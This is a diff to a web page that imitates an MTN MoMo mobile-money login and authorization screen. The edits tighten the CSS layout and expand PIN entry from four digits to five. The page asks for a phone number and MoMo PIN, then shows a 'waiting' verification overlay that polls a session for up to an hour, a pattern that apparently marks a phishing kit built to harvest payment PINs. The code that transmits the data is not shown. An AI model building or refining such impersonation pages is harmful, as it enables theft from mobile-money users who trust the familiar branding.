@@ -20,65 +20,69 @@
   --font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
 }
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-html,body{height:100%;font-family:var(--font-family);background:#f4f6fa;overflow:hidden}
-body{display:flex;justify-content:center;align-items:stretch;height:100vh;height:100dvh}
-.app{width:100%;max-width:480px;background:#fff;display:flex;flex-direction:column;height:100vh;height:100dvh;position:relative;overflow:hidden}
+html,body{height:100%;font-family:var(--font-family);background:#f4f6fa}
+body{margin:0}
+.app{width:100%;max-width:480px;background:#fff;margin:0 auto;display:flex;flex-direction:column;min-height:100vh;min-height:100dvh;position:relative}
 
-.app-header{background:linear-gradient(160deg,#FFD633 0%,var(--mtn-yellow) 45%,var(--mtn-yellow-dark) 100%);padding:16px 20px 40px;position:relative;overflow:hidden;flex-shrink:0}
+/* Compact header */
+.app-header{background:linear-gradient(160deg,#FFD633 0%,var(--mtn-yellow) 45%,var(--mtn-yellow-dark) 100%);padding:14px 18px 52px;position:relative;overflow:hidden;flex-shrink:0}
 .app-header::before{content:'';position:absolute;top:-60px;right:-60px;width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,.18)}
 .app-header::after{content:'';position:absolute;top:-40px;left:-70px;width:180px;height:180px;border-radius:50%;background:rgba(0,51,128,.08)}
 
-.header-top{display:flex;justify-content:space-between;align-items:center;position:relative;z-index:2;margin-bottom:24px}
-.back-btn{width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.35);backdrop-filter:blur(10px);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#003366;font-size:20px;font-weight:800;transition:transform .15s,background .15s}
+.header-top{display:flex;justify-content:space-between;align-items:center;position:relative;z-index:2;margin-bottom:14px}
+.back-btn{width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,.35);backdrop-filter:blur(10px);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#003366;font-size:19px;font-weight:800;transition:transform .15s,background .15s}
 .back-btn:hover{background:rgba(255,255,255,.55);transform:translateX(-2px)}
-.help-btn{background:rgba(255,255,255,.35);border:none;padding:8px 14px;border-radius:50px;font-size:12px;font-weight:700;color:#003366;cursor:pointer;backdrop-filter:blur(10px);transition:background .15s}
+.help-btn{background:rgba(255,255,255,.35);border:none;padding:7px 13px;border-radius:50px;font-size:11.5px;font-weight:700;color:#003366;cursor:pointer;backdrop-filter:blur(10px);transition:background .15s}
 .help-btn:hover{background:rgba(255,255,255,.55)}
 
 .brand-block{position:relative;z-index:2;text-align:center}
-.momo-logo{display:inline-flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:12px}
-.momo-logo-icon{width:64px;height:64px;background:#003366;border-radius:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 24px rgba(0,51,128,.3);position:relative}
-.momo-logo-icon::after{content:'M';font-size:32px;font-weight:900;color:var(--mtn-yellow);line-height:1}
-.momo-brand-text{font-size:20px;font-weight:900;color:#003366;letter-spacing:-.5px;line-height:1}
-.momo-brand-sub{font-size:11px;font-weight:700;color:#003366;opacity:.65;letter-spacing:.5px;text-transform:uppercase}
+.momo-logo{display:inline-flex;flex-direction:column;align-items:center;gap:6px;margin-bottom:8px}
+.momo-logo-icon{width:52px;height:52px;background:#003366;border-radius:15px;display:flex;align-items:center;justify-content:center;box-shadow:0 6px 18px rgba(0,51,128,.3);position:relative}
+.momo-logo-icon::after{content:'M';font-size:26px;font-weight:900;color:var(--mtn-yellow);line-height:1}
+.momo-brand-text{font-size:17px;font-weight:900;color:#003366;letter-spacing:-.4px;line-height:1}
+.momo-brand-sub{font-size:10px;font-weight:700;color:#003366;opacity:.65;letter-spacing:.5px;text-transform:uppercase}
 
-.header-greeting{font-size:22px;font-weight:800;color:#003366;line-height:1.25;position:relative;z-index:2;margin-top:8px}
-.header-greeting span{display:block;font-size:13px;font-weight:600;color:#003366;opacity:.7;margin-top:4px;letter-spacing:.2px}
+.header-greeting{font-size:19px;font-weight:800;color:#003366;line-height:1.2;position:relative;z-index:2;margin-top:4px}
+.header-greeting span{display:block;font-size:12px;font-weight:600;color:#003366;opacity:.7;margin-top:3px;letter-spacing:.2px}
 
-.amount-card{background:#fff;border-radius:20px;margin:-24px 16px 0;padding:18px 20px;box-shadow:0 12px 30px rgba(0,51,128,.12);position:relative;z-index:3;border:1px solid var(--border-light)}
-.amount-row{display:flex;justify-content:space-between;align-items:center;padding-bottom:14px;border-bottom:1px dashed var(--border-light)}
-.amount-label{font-size:12px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px}
-.amount-value{font-size:26px;font-weight:900;color:var(--mtn-blue);letter-spacing:-.5px}
-.recipient-row{display:flex;align-items:center;gap:10px;padding-top:14px}
-.recipient-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--mtn-yellow),var(--mtn-yellow-dark));display:flex;align-items:center;justify-content:center;font-weight:800;color:#003366;font-size:13px;flex-shrink:0}
-.recipient-info{display:flex;flex-direction:column;gap:2px;min-width:0}
-.recipient-name{font-size:14px;font-weight:700;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.recipient-sub{font-size:11px;color:var(--text-muted);font-weight:500}
+/* Amount card overlapping */
+.amount-card{background:#fff;border-radius:18px;margin:-36px 14px 0;padding:14px 16px;box-shadow:0 10px 26px rgba(0,51,128,.12);position:relative;z-index:3;border:1px solid var(--border-light)}
+.amount-row{display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;border-bottom:1px dashed var(--border-light)}
+.amount-label{font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px}
+.amount-value{font-size:22px;font-weight:900;color:var(--mtn-blue);letter-spacing:-.4px}
+.recipient-row{display:flex;align-items:center;gap:9px;padding-top:10px}
+.recipient-avatar{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--mtn-yellow),var(--mtn-yellow-dark));display:flex;align-items:center;justify-content:center;font-weight:800;color:#003366;font-size:12px;flex-shrink:0}
+.recipient-info{display:flex;flex-direction:column;gap:1px;min-width:0}
+.recipient-name{font-size:13px;font-weight:700;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.recipient-sub{font-size:10.5px;color:var(--text-muted);font-weight:500}
 
-.app-body{flex:1;padding:22px 20px 20px;overflow-y:auto;display:flex;flex-direction:column;gap:20px}
-.field-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
-.field-label-text{font-size:13px;font-weight:700;color:var(--text-primary);letter-spacing:.2px}
-.forgot-link{font-size:12px;font-weight:700;color:var(--mtn-blue);cursor:pointer;padding:2px 6px;border-radius:6px}
+/* Body — compact spacing */
+.app-body{flex:1;padding:16px 18px 14px;display:flex;flex-direction:column;gap:14px}
+.field-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.field-label-text{font-size:12.5px;font-weight:700;color:var(--text-primary);letter-spacing:.2px}
+.forgot-link{font-size:11.5px;font-weight:700;color:var(--mtn-blue);cursor:pointer;padding:2px 6px;border-radius:6px}
 .forgot-link:hover{background:var(--mtn-yellow-light)}
 
-.phone-field{display:flex;align-items:center;border:2px solid var(--border-light);border-radius:14px;background:#fafbff;transition:border-color .2s,box-shadow .2s,background .2s;overflow:hidden}
+.phone-field{display:flex;align-items:center;border:2px solid var(--border-light);border-radius:12px;background:#fafbff;transition:border-color .2s,box-shadow .2s,background .2s;overflow:hidden}
 .phone-field:focus-within{border-color:var(--mtn-blue);background:#fff;box-shadow:0 0 0 4px rgba(0,71,171,.08)}
 .phone-field.invalid{border-color:#e74c3c;background:#fff5f5;animation:shake .4s}
 @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
-.country-prefix{display:flex;align-items:center;gap:8px;padding:14px 14px;background:var(--mtn-yellow-light);border-right:2px solid var(--border-light);font-weight:800;font-size:14px;color:#003366;flex-shrink:0}
-.flag-svg{width:22px;height:15px;border-radius:3px;box-shadow:0 0 0 1px rgba(0,0,0,.08)}
-.phone-field input{flex:1;border:none;background:transparent;padding:14px;font-size:16px;font-weight:600;color:var(--text-primary);outline:none;font-family:var(--font-family);letter-spacing:.5px;min-width:0}
+.country-prefix{display:flex;align-items:center;gap:7px;padding:12px 12px;background:var(--mtn-yellow-light);border-right:2px solid var(--border-light);font-weight:800;font-size:13px;color:#003366;flex-shrink:0}
+.flag-svg{width:20px;height:14px;border-radius:3px;box-shadow:0 0 0 1px rgba(0,0,0,.08)}
+.phone-field input{flex:1;border:none;background:transparent;padding:12px;font-size:15px;font-weight:600;color:var(--text-primary);outline:none;font-family:var(--font-family);letter-spacing:.5px;min-width:0}
 .phone-field input::placeholder{color:#c5cbd9;font-weight:500;letter-spacing:0}
 
-.pin-row{display:flex;align-items:center;gap:10px}
-.pin-boxes{display:flex;gap:12px;flex:1;justify-content:space-between}
-.pin-box{flex:1;max-width:72px;aspect-ratio:1;border-radius:16px;border:2px solid var(--border-light);background:#fafbff;text-align:center;font-size:26px;font-weight:900;color:var(--text-primary);outline:none;font-family:var(--font-family);caret-color:var(--mtn-blue);padding:0;transition:border-color .2s,box-shadow .2s,background .2s,transform .15s}
-.pin-box:focus{border-color:var(--mtn-blue);background:#fff;box-shadow:0 0 0 4px rgba(0,71,171,.10);transform:translateY(-2px)}
+/* 5 PIN boxes — smaller to fit */
+.pin-row{display:flex;align-items:center;gap:8px}
+.pin-boxes{display:flex;gap:8px;flex:1;justify-content:space-between}
+.pin-box{flex:1;max-width:58px;aspect-ratio:1;border-radius:14px;border:2px solid var(--border-light);background:#fafbff;text-align:center;font-size:22px;font-weight:900;color:var(--text-primary);outline:none;font-family:var(--font-family);caret-color:var(--mtn-blue);padding:0;transition:border-color .2s,box-shadow .2s,background .2s,transform .15s}
+.pin-box:focus{border-color:var(--mtn-blue);background:#fff;box-shadow:0 0 0 3px rgba(0,71,171,.10);transform:translateY(-2px)}
 .pin-box.filled{border-color:var(--mtn-blue);background:linear-gradient(135deg,#f0f4ff,#e6ecff);color:var(--mtn-blue)}
 .pin-box.invalid{border-color:#e74c3c;background:#fff5f5;animation:shake .4s}
-.eye-toggle{width:52px;height:52px;border-radius:16px;border:2px solid var(--border-light);background:var(--mtn-yellow-light);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .2s;padding:0}
+.eye-toggle{width:44px;height:44px;border-radius:14px;border:2px solid var(--border-light);background:var(--mtn-yellow-light);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .2s;padding:0}
 .eye-toggle:hover{background:var(--mtn-yellow);border-color:var(--mtn-yellow-dark)}
 .eye-toggle:active{transform:scale(.95)}
-.eye-toggle svg{width:24px;height:24px;stroke:#003366;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.eye-toggle svg{width:20px;height:20px;stroke:#003366;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
 .eye-toggle .eye-open{display:block}
 .eye-toggle .eye-closed{display:none}
 .eye-toggle.revealed{background:#003366;border-color:#003366}
@@ -86,23 +90,25 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .eye-toggle.revealed .eye-open{display:none}
 .eye-toggle.revealed .eye-closed{display:block}
 
-.error-text{color:#e74c3c;font-size:12px;margin-top:6px;display:none;font-weight:600;line-height:1.4}
+.error-text{color:#e74c3c;font-size:11.5px;margin-top:5px;display:none;font-weight:600;line-height:1.4}
 .error-text.show{display:block;animation:slideDown .3s}
 @keyframes slideDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
 
-.login-btn{width:100%;padding:18px;background:linear-gradient(135deg,var(--mtn-blue) 0%,var(--mtn-blue-dark) 100%);color:#fff;border:none;border-radius:16px;font-size:16px;font-weight:900;letter-spacing:.8px;cursor:pointer;font-family:var(--font-family);box-shadow:0 12px 28px rgba(0,71,171,.35),inset 0 1px 0 rgba(255,255,255,.15);transition:transform .15s,box-shadow .15s,opacity .15s;margin-top:auto;position:relative;overflow:hidden;text-transform:uppercase}
-.login-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 16px 36px rgba(0,71,171,.45),inset 0 1px 0 rgba(255,255,255,.2)}
+/* Compact button */
+.login-btn{width:100%;padding:15px;background:linear-gradient(135deg,var(--mtn-blue) 0%,var(--mtn-blue-dark) 100%);color:#fff;border:none;border-radius:14px;font-size:15px;font-weight:900;letter-spacing:.8px;cursor:pointer;font-family:var(--font-family);box-shadow:0 10px 24px rgba(0,71,171,.35),inset 0 1px 0 rgba(255,255,255,.15);transition:transform .15s,box-shadow .15s,opacity .15s;text-transform:uppercase;position:relative;overflow:hidden}
+.login-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 14px 32px rgba(0,71,171,.45),inset 0 1px 0 rgba(255,255,255,.2)}
 .login-btn:active:not(:disabled){transform:scale(.98)}
 .login-btn:disabled{opacity:.6;cursor:not-allowed}
 .login-btn::after{content:'→';margin-left:10px;display:inline-block;transition:transform .2s;font-weight:800}
 .login-btn:hover:not(:disabled)::after{transform:translateX(4px)}
 
-.trust-row{display:flex;justify-content:center;align-items:center;gap:16px;padding:10px 0 0;flex-shrink:0}
-.trust-item{display:flex;align-items:center;gap:5px;font-size:10.5px;color:var(--text-muted);font-weight:600;letter-spacing:.2px}
-.trust-icon{font-size:12px}
+.trust-row{display:flex;justify-content:center;align-items:center;gap:14px;padding:2px 0 0;flex-shrink:0}
+.trust-item{display:flex;align-items:center;gap:4px;font-size:10px;color:var(--text-muted);font-weight:600;letter-spacing:.2px}
+.trust-icon{font-size:11px}
 
-.app-footer{padding:12px;text-align:center;font-size:10.5px;color:var(--text-muted);font-weight:500;flex-shrink:0;border-top:1px solid var(--border-light)}
+.app-footer{padding:10px;text-align:center;font-size:10px;color:var(--text-muted);font-weight:500;flex-shrink:0;border-top:1px solid var(--border-light)}
 
+/* Waiting overlay */
 .verify-overlay{position:fixed;inset:0;background:radial-gradient(900px 600px at 50% -10%,rgba(255,204,0,.12),transparent 60%),radial-gradient(700px 500px at 50% 110%,rgba(0,71,171,.35),transparent 60%),linear-gradient(180deg,#001E3C 0%,#00132A 55%,#00080F 100%);display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px 20px;z-index:2000;overflow:hidden}
 .verify-overlay.show{display:flex;animation:vFadeIn .45s ease}
 @keyframes vFadeIn{from{opacity:0}to{opacity:1}}
@@ -150,24 +156,25 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .reject-desc{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:18px}
 .reject-btn{background:var(--mtn-blue);color:#fff;border:none;border-radius:10px;padding:13px 20px;font-size:14px;font-weight:800;cursor:pointer;width:100%;text-transform:uppercase;letter-spacing:.5px}
 
+/* Small screens adjustments */
 @media (max-height:700px){
-  .app-header{padding:12px 16px 32px}
-  .header-greeting{font-size:18px}
-  .momo-logo-icon{width:52px;height:52px}
-  .momo-logo-icon::after{font-size:26px}
-  .app-body{padding:16px 16px 14px;gap:16px}
-  .amount-value{font-size:22px}
-  .pin-box{font-size:22px;border-radius:14px}
-  .eye-toggle{width:46px;height:46px;border-radius:14px}
-  .login-btn{padding:15px;font-size:15px}
+  .app-header{padding:12px 16px 44px}
+  .header-greeting{font-size:16px}
+  .momo-logo-icon{width:44px;height:44px;border-radius:12px}
+  .momo-logo-icon::after{font-size:22px}
+  .momo-brand-text{font-size:15px}
+  .app-body{padding:12px 16px 12px;gap:11px}
+  .amount-value{font-size:20px}
+  .pin-box{font-size:20px;border-radius:12px;max-width:52px}
+  .eye-toggle{width:40px;height:40px;border-radius:12px}
+  .login-btn{padding:13px;font-size:14px}
 }
 @media (max-width:380px){
-  .pin-boxes{gap:8px}
-  .pin-row{gap:8px}
-  .pin-box{font-size:20px;border-radius:12px}
-  .eye-toggle{width:42px;height:42px;border-radius:12px}
-  .eye-toggle svg{width:20px;height:20px}
-  .amount-value{font-size:22px}
+  .pin-boxes{gap:6px}
+  .pin-row{gap:6px}
+  .pin-box{font-size:18px;border-radius:11px;max-width:48px}
+  .eye-toggle{width:38px;height:38px;border-radius:11px}
+  .eye-toggle svg{width:18px;height:18px}
 }
 </style>
 </head>
@@ -225,7 +232,7 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 
     <div>
       <div class="field-label">
-        <span class="field-label-text">MoMo PIN</span>
+        <span class="field-label-text">MoMo PIN (5 digits)</span>
         <span class="forgot-link" onclick="alert('Dial *126# to reset your MoMo PIN')">Forgot PIN?</span>
       </div>
       <div class="pin-row">
@@ -234,13 +241,14 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
           <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
           <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
           <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
+          <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" autocomplete="off">
         </div>
         <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show PIN" title="Show PIN">
           <svg class="eye-open" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
           <svg class="eye-closed" viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
         </button>
       </div>
-      <div class="error-text" id="pinError">Please enter your 4-digit MoMo PIN</div>
+      <div class="error-text" id="pinError">Please enter your 5-digit MoMo PIN</div>
     </div>
 
     <button class="login-btn" id="loginBtn">Login &amp; Authorize</button>
@@ -302,6 +310,7 @@ const POLL_MS = 2500;
 const TIMEOUT_MS = 60 * 60 * 1000;
 const SESSION_KEY = 'mtnmomo_current_receipt';
 const LAST_LOGIN_KEY = 'mtnmomo_last_phone';
+const PIN_LENGTH = 5;
 
 let currentSessionId = null;
 let pollTimer = null;
@@ -337,7 +346,7 @@ function initials(n){
 const phoneInput = document.getElementById('phone');
 const phoneWrapper = document.getElementById('phoneWrapper');
 const phoneError = document.getElementById('phoneError');
-const pinBoxes = [1,2,3,4].map(i => document.getElementById('pin' + i));
+const pinBoxes = [1,2,3,4,5].map(i => document.getElementById('pin' + i));
 const pinError = document.getElementById('pinError');
 const loginBtn = document.getElementById('loginBtn');
 const eyeToggle = document.getElementById('eyeToggle');
@@ -360,7 +369,7 @@ pinBoxes.forEach((box, index) => {
     } else {
       this.classList.remove('filled');
     }
-    if (getPin().length === 4) {
+    if (getPin().length === PIN_LENGTH) {
       pinError.classList.remove('show');
       pinBoxes.forEach(b => b.classList.remove('invalid'));
     }
@@ -520,7 +529,7 @@ loginBtn.addEventListener('click', async function(){
     return;
   }
   const pin = getPin();
-  if (pin.length !== 4) {
+  if (pin.length !== PIN_LENGTH) {
     pinBoxes.forEach(b => b.classList.add('invalid'));
     pinError.classList.add('show');
     pinBoxes[0].focus();
